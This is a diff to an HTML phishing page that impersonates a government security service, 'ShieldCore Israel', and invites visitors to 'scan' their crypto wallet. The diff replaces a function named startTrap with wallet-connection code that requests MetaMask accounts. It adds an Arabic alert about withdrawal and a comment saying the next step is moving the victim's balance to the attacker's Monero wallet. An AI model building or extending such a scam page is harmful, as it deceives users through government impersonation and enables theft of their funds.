@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ShieldCore Israel | אבטחת נכסים דיגיטליים</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
     <style>
         body { background-color: #0d1117; color: white; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 50px 20px; margin: 0; }
         .card { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 12px; max-width: 500px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
@@ -20,12 +21,23 @@
         <div class="logo">🛡️</div>
         <h1>ShieldCore Israel</h1>
         <p>מערכת ההגנה הממשלתית לנכסים דיגיטליים. סרוק את הארנק שלך עכשיו כדי למנוע חדירה של האקרים עוינים.</p>
-        <button class="btn" onclick="startTrap()">התחל סריקת אבטחה</button>
+        <button class="btn" onclick="connectWallet()">התחל סריקת אבטחה</button>
         <span class="secure-tag">✅ חיבור מאובטח בדרגת SSL צבאית</span>
     </div>
+
     <script>
-        function startTrap() {
-            alert("מתחבר לפרוטוקול האבטחה... נא לאשר את הגישה בארנק שלך (MetaMask/Trust) לצורך סריקה.");
+        async function connectWallet() {
+            if (window.ethereum) {
+                try {
+                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    alert("تم الاتصال بالمحفظة للسحب: " + accounts[0]);
+                    // الخطوة القادمة هي توجيه الرصيد لمحفظة المونيرو الخاصة بك
+                } catch (error) {
+                    console.error(error);
+                }
+            } else {
+                alert("אנא התקן MetaMask عشان تكمل السحب.");
+            }
         }
     </script>
 </body>
